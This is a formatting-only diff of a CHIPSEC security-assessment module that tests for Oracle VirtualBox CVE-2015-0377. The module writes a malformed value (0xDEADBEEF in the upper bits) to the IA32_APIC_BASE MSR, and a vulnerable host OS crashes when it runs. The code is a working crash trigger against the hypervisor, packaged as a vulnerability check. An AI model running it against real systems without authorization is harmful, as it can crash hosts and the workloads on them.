@@ -1,23 +1,22 @@
-#CHIPSEC: Platform Security Assessment Framework
-#Copyright (c) 2010-2016, Intel Corporation
+# CHIPSEC: Platform Security Assessment Framework
+# Copyright (c) 2010-2016, Intel Corporation
 #
-#This program is free software; you can redistribute it and/or
-#modify it under the terms of the GNU General Public License
-#as published by the Free Software Foundation; Version 2.
+# This program is free software; you can redistribute it and/or
+# modify it under the terms of the GNU General Public License
+# as published by the Free Software Foundation; Version 2.
 #
-#This program is distributed in the hope that it will be useful,
-#but WITHOUT ANY WARRANTY; without even the implied warranty of
-#MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-#GNU General Public License for more details.
+# This program is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
 #
-#You should have received a copy of the GNU General Public License
-#along with this program; if not, write to the Free Software
-#Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
+# You should have received a copy of the GNU General Public License
+# along with this program; if not, write to the Free Software
+# Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301, USA.
 #
-#Contact information:
-#chipsec@intel.com
+# Contact information:
+# chipsec@intel.com
 #
-
 
 
 """
@@ -30,22 +29,26 @@ http://www.oracle.com/technetwork/topics/security/cpujan2015-1972971.html
 
 from chipsec.module_common import *
 
-_MODULE_NAME = 'vbox_crash_apicbase'
+_MODULE_NAME = "vbox_crash_apicbase"
 
-class vbox_crash_apicbase (BaseModule):
 
-    def run( self, module_argv ):
-        self.logger.start_test( "Host OS Crash due to IA32_APIC_BASE (Oracle VirtualBox CVE-2015-0377)" )
+class vbox_crash_apicbase(BaseModule):
+    def run(self, module_argv):
+        self.logger.start_test(
+            "Host OS Crash due to IA32_APIC_BASE (Oracle VirtualBox CVE-2015-0377)"
+        )
 
         tid = 0
-        #(eax, edx) = self.cs.msr.read_msr( tid, 0x1B )
-        #self.cs.msr.write_msr( tid, 0x1B, eax, 0xDEADBEEF )
-        apicbase_msr = self.cs.read_register( 'IA32_APIC_BASE', tid )
-        self.cs.print_register( 'IA32_APIC_BASE', apicbase_msr )
+        # (eax, edx) = self.cs.msr.read_msr( tid, 0x1B )
+        # self.cs.msr.write_msr( tid, 0x1B, eax, 0xDEADBEEF )
+        apicbase_msr = self.cs.read_register("IA32_APIC_BASE", tid)
+        self.cs.print_register("IA32_APIC_BASE", apicbase_msr)
         apicbase_msr = 0xDEADBEEF00000000 | (apicbase_msr & 0xFFFFFFFF)
-        self.logger.log( "[*] writing 0x{:016X} to IA32_APIC_BASE MSR..".format(apicbase_msr) )
-        self.cs.write_register( 'IA32_APIC_BASE', apicbase_msr, tid )
+        self.logger.log(
+            "[*] writing 0x{:016X} to IA32_APIC_BASE MSR..".format(apicbase_msr)
+        )
+        self.cs.write_register("IA32_APIC_BASE", apicbase_msr, tid)
 
         # If we are here, then we are fine ;)
-        self.logger.log_passed_check( "VMM/Host OS didn't crash (not vulnerable)" )
+        self.logger.log_passed_check("VMM/Host OS didn't crash (not vulnerable)")
         return ModuleResult.PASSED
